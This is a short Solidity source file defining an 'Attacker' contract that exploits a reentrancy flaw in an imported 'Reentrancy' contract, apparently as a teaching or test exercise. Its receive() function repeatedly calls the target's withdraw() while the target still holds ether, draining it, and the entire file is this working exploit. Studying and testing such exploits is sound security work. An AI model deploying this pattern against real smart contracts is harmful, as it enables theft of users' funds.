// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { Reentrancy } from "./Reentrancy.sol";

contract Attacker {
    Reentrancy public target;
    uint256 public amount;

    constructor(address _target) {
        target = Reentrancy(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(amount);
        }
    }

    function deposit() public payable {
        target.deposit{ value: msg.value }();
    }

    function attack(uint256 _amount) public payable {
        amount = _amount;
        target.withdraw(_amount);
    }
}
